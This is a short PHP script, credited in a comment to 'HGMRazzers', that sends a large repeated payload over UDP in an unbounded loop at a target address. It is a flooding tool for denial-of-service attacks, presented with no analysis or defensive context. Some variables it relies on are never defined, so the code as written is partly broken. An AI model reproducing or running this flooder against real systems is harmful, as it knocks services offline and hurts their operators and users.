<?php

//=================================================
//Coded by HGMRazzers By HGM
//=================================================

$packets = 0;
$ip = $_SERVER['REMOTE_ADDR'];
set_time_limit(0);
ignore_user_abort(FALSE);


$time = time();
$max_time = $time+$exec_time;



for($i=0;$i<65535;$i++){
        $out .= "AIzaSyCWGIOw6F0ddw";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
        
        $fp = fsockopen("udp://$ip", $port, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
?>

